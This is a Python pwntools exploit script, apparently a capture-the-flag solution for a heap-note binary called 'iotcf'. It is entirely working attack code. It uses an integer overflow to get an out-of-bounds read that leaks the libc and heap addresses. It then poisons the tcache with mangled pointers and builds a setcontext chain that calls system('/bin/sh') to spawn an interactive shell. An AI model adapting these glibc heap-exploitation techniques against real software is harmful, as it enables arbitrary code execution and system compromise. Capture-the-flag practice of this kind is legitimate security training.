#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from setcontext32 import *

exe = context.binary = ELF('iotcf_patched')
libc = exe.libc
context.terminal = ['xfce4-terminal', '--title=GDB-Pwn', '--zoom=0', '--geometry=128x50+1100+0', '-e']
context.log_level = 'info'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    elif args.DOCKER:
        p = remote("localhost", 1337)
        time.sleep(1)
        pid = process(["pgrep", "-fx", "/home/app/chall"]).recvall().strip().decode()
        gdb.attach(int(pid), gdbscript=gdbscript, exe=exe.path)
        return p
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()


def in_note(size, data):
    io.sendlineafter(b">>", b"1")
    io.sendlineafter(b">>", str(size).encode())
    io.sendafter(b">>", data)

def out_note(idx):
    io.sendlineafter(b">>", b"2")
    io.sendlineafter(b">>", str(idx).encode())
    io.recvuntil(b": ")
    data = io.recv(0x540)
    return data

def delete_note(idx):
    io.sendlineafter(b">>", b"3")
    io.sendlineafter(b">>", str(idx).encode())

def convert(target):
    max_long_long = 0x7FFFFFFFFFFFFFFF
    result = (max_long_long + target + 1) & 0xFFFFFFFFFFFFFFFF

    if result & (1 << 63):
        return result - (1 << 64)
    return result

def mangle(heap_addr, val):
    return (heap_addr >> 12) ^ val  


def solve():

    """
    Setup heap to allocate a chunk that would be placed in the unsorted bin then leak main_arena with int overflow -> oob read
    """

    in_note(0x10, b"consolidation")
    in_note(convert(0x500), b"unsorted bin")
    in_note(0x10, b"heap leak")

    delete_note(0)
    in_note(convert(0x10000), b"junk")
    delete_note(1)
    delete_note(2)

    """
    Parse leaked data:
    - heap address
    - libc address
    """

    data = out_note(0)
    chunks = [data[i:i+8] for i in range(0, len(data), 8)]
    main_arena = u64(chunks[4])
    heap_addr = u64(chunks[-2])

    libc.address = main_arena - (libc.sym["main_arena"] + 96)
    heap_base = heap_addr << 12

    info("libc base: %#x", libc.address)
    info("heap base: %#x", heap_base)

    """
    Tcache poisoning -> Setcontext 
    """

    in_note(0x10, b"junk")

    for i in range(3):
        in_note(0x10, b"A"*8)

    for i in range(4, 1, -1):
        delete_note(i)

    addr, chain = setcontext32(libc, rip=libc.sym["system"], rdi=next(libc.search(b"/bin/sh\x00")))

    payload = b"A"*(8*3) + p64(0x21) + p64(mangle(heap_base, addr))
    in_note(convert(0x10000), payload)

    in_note(0x10, b"junk")
    in_note(convert(0x10000), chain)

    io.interactive()


def main():
    
    init()
    solve()
    

if __name__ == '__main__':
    main()

